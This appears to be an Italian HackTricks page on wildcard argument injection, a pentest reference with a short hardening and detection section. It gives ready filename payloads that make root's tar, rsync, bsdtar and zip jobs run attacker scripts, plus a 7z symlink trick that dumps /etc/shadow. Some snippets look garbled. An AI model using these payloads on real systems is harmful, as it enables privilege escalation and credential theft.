# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> L'iniezione di **argomenti wildcard** (noto anche come *glob*) si verifica quando uno script privilegiato esegue un binario Unix come `tar`, `chown`, `rsync`, `zip`, `7z`, … con un wildcard non quotato come `*`.
> Poiché la shell espande il wildcard **prima** di eseguire il binario, un attaccante che può creare file nella directory di lavoro può creare nomi di file che iniziano con `-` in modo che vengano interpretati come **opzioni invece di dati**, permettendo di contrabbandare flag arbitrari o persino comandi.
> Questa pagina raccoglie le primitive più utili, le ricerche recenti e le rilevazioni moderne per il 2023-2025.

## chown / chmod

Puoi **copiare il proprietario/gruppo o i bit di autorizzazione di un file arbitrario** abusando del flag `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Quando root esegue successivamente qualcosa come:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` viene iniettato, causando che *tutti* i file corrispondenti ereditino la proprietà/permissi di `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (attacco combinato).
Vedi anche il classico documento di DefenseCode per dettagli.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Esegui comandi arbitrari abusando della funzionalità **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Una volta che root esegue ad esempio `tar -czf /root/backup.tgz *`, `shell.sh` viene eseguito come root.

### bsdtar / macOS 14+

Il `tar` predefinito su macOS recenti (basato su `libarchive`) *non* implementa `--checkpoint`, ma puoi comunque ottenere l'esecuzione di codice con il flag **--use-compress-program** che ti consente di specificare un compressore esterno.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Quando uno script con privilegi esegue `tar -cf backup.tar *`, verrà avviato `/bin/sh`.

---

## rsync

`rsync` ti consente di sovrascrivere la shell remota o persino il binario remoto tramite flag da riga di comando che iniziano con `-e` o `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Se l'utente root archivia successivamente la directory con `rsync -az * backup:/srv/`, il flag iniettato genera la tua shell sul lato remoto.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Anche quando lo script privilegiato *difensivamente* antepone il carattere jolly con `--` (per fermare l'analisi delle opzioni), il formato 7-Zip supporta **file di elenco file** anteponendo il nome del file con `@`. Combinando ciò con un symlink ti consente di *esfiltrare file arbitrari*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Se root esegue qualcosa come:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip tenterà di leggere `root.txt` (→ `/etc/shadow`) come un elenco di file e uscirà, **stampando il contenuto su stderr**.

---

## zip

`zip` supporta il flag `--unzip-command` che viene passato *verbatim* alla shell di sistema quando l'archivio verrà testato:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Injecta il flag tramite un nome file creato ad arte e attendi che lo script di backup privilegiato chiami `zip -T` (test archive) sul file risultante.

---

## Binaries aggiuntivi vulnerabili all'iniezione di wildcard (lista rapida 2023-2025)

I seguenti comandi sono stati abusati in CTF moderni e in ambienti reali. Il payload è sempre creato come un *nome file* all'interno di una directory scrivibile che sarà successivamente elaborata con un wildcard:

| Binary | Flag da abusare | Effetto |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrario `@file` | Leggi il contenuto del file |
| `flock` | `-c <cmd>` | Esegui il comando |
| `git`   | `-c core.sshCommand=<cmd>` | Esecuzione del comando tramite git su SSH |
| `scp`   | `-S <cmd>` | Avvia un programma arbitrario invece di ssh |

Queste primitive sono meno comuni rispetto ai classici *tar/rsync/zip* ma vale la pena controllarle durante la ricerca.

---

## Rilevamento e Indurimento

1. **Disabilita il globbing della shell** negli script critici: `set -f` (`set -o noglob`) previene l'espansione dei wildcard.
2. **Cita o scappa** gli argomenti: `tar -czf "$dst" -- *` non è sicuro — preferisci `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Percorsi espliciti**: Usa `/var/www/html/*.log` invece di `*` in modo che gli attaccanti non possano creare file fratelli che iniziano con `-`.
4. **Minimo privilegio**: Esegui lavori di backup/manutenzione come un account di servizio non privilegiato invece di root quando possibile.
5. **Monitoraggio**: La regola predefinita di Elastic *Potential Shell via Wildcard Injection* cerca `tar --checkpoint=*`, `rsync -e*`, o `zip --unzip-command` immediatamente seguito da un processo figlio della shell. La query EQL può essere adattata per altri EDR.

---

## Riferimenti

* Elastic Security – Regola rilevata Potenziale Shell tramite Iniezione di Wildcard (ultimo aggiornamento 2025)
* Rutger Flohil – “macOS — Iniezione di wildcard in Tar” (18 Dic 2024)

{{#include ../../banners/hacktricks-training.md}}
